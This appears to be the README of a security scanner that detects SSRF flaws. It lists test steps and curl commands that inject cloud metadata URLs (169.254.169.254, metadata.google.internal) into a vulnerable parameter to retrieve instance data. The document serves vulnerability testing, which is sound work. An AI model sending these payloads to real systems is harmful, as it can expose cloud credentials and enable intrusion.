## Use case

The scanner probes known internal endpoints to detect SSRF vulnerabilities, which can expose sensitive cloud instance credentials. This is critical in cloud environments where misconfigurations can lead to significant security risks.

## Steps to test

1. Identify a web application that accepts user input for URLs.
2. Inject SSRF payloads such as 'http://169.254.169.254/latest/meta-data/' into the vulnerable parameter.
3. Observe the response for sensitive information like 'ami-id', 'instance-id', or 'project-id'.
4. Confirm SSRF vulnerability if any of the sensitive data is returned in the response.

## Commands

```text
curl -X GET 'http://example.com/vulnerable_endpoint?url=http://169.254.169.254/latest/meta-data/'
curl -X GET 'http://example.com/vulnerable_endpoint?url=http://metadata.google.internal/'
python3 -m venv venv && source venv/bin/activate
python app.py
```
